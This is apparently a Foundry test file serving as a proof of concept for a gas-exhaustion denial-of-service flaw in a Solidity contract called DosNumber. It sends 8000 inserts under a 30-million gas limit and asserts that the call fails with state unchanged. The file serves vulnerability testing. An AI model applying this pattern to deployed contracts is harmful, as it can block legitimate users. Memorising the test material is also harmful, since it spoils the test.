// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/dos_number.sol";

contract DosNumberTest is Test {
    DosNumber public dosContract;
    address testUser = makeAddr("testUser");

    function setUp() public {
        dosContract = new DosNumber();
    }

    function test_insertNnumbersGasDOS() public {
        console.log("--- BEFORE-Trigger State ---");
        uint initialRealLength = dosContract.getRealLengthArray();
        uint initialArrayLength = dosContract.getLengthArray();
        (uint userInsertsBefore, ) = dosContract.getUserStats(testUser);
        console.log("Initial Real Length    :", initialRealLength);
        console.log("Initial Array Length   :", initialArrayLength);
        console.log("Initial User Inserts   :", userInsertsBefore);
        
        console.log("--- Trigger Gas DOS ---");
        vm.startPrank(testUser);
        uint gasLimit = 30e6;
        (bool success, ) = address(dosContract).call{gas: gasLimit}(
            abi.encodeWithSelector(
                DosNumber.insertNnumbers.selector, 
                1, 
                8000
            )
        );
        vm.stopPrank();
        console.log("Transaction result     : %s", success ? "SUCCESS" : "FAILED");
        
        console.log("--- AFTER-Trigger State ---");
        uint afterRealLength = dosContract.getRealLengthArray();
        uint afterArrayLength = dosContract.getLengthArray();
        (uint userInsertsAfter, ) = dosContract.getUserStats(testUser);
        console.log("After Real Length      :", afterRealLength);
        console.log("After Array Length     :", afterArrayLength);
        console.log("After User Inserts     :", userInsertsAfter);
        
        console.log("--- Differential Verification ---");
        bool stateUnchanged = (afterRealLength == initialRealLength) && 
                              (afterArrayLength == initialArrayLength) && 
                              (userInsertsAfter == userInsertsBefore);
        console.log("State unchanged?        : %s", stateUnchanged ? "YES" : "NO");
        console.log("Transaction failed?     : %s", !success ? "YES" : "NO");
        
        bool vulnerabilityExists = !success && stateUnchanged;
        console.log("Vulnerability condition : %s", 
            vulnerabilityExists ? "TRUE: State unchanged and TX failed" : "FALSE: State changed or TX succeeded");
        
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: transaction failed and state unchanged");
        } else {
            console.log("Vulnerability not Exist: state changed or transaction succeeded");
        }
        
        assertTrue(vulnerabilityExists, "Test Failed: Vulnerability not exploited");
    }
}